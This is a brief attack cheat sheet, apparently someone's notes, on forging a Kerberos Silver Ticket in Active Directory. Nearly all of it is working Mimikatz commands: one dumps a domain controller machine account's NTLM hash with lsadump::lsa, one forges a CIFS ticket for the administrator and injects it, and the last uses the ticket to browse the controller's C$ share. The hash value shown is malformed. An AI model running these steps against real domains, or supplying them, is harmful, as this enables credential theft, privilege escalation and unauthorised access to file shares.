Silver ticket
-------------
1. Pass the hash to domain admin
2. Get the domain controller (KDC) --> user : PROD$ hash NTLM

C:> invoke-mimikatz -command '"lsadump::lsa /inject"' -Computername prod.research.SECURITY.local

3. Generate silver ticket to the administrator with KDC

C:> invoke-mimikatz -command '"kerberos::golden /domain:research.security.local /sid:S-1-5-21-1693200156-3137632808-1858025440(domin-user) /target:prod.research.security.local /service:CIFS /rc4:f2c8slad8245023845(KDC's NTLM hash) 
/user:administrator /ptt"'

CIFS is a protocol used for sharing files, printers, and serial ports over a network.
When an attacker forges a Silver Ticket for the CIFS service, they are essentially creating a ticket that grants access to file shares on the network.

4. Check the ticket
C:> klist 

5. Finally can access the domain controller
ls \\prod.research.security.local\c$
